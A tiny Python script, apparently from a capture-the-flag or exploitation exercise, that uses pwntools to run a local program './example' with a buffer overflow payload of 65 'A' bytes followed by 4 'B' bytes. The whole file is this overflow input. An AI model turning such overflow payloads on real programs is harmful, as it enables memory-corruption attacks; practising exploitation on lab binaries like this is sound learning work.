from pwn import *



payload = [
    b'A' * 65,
    b'B' * 4
]

payload = b"".join(payload)


process(['./example', payload])

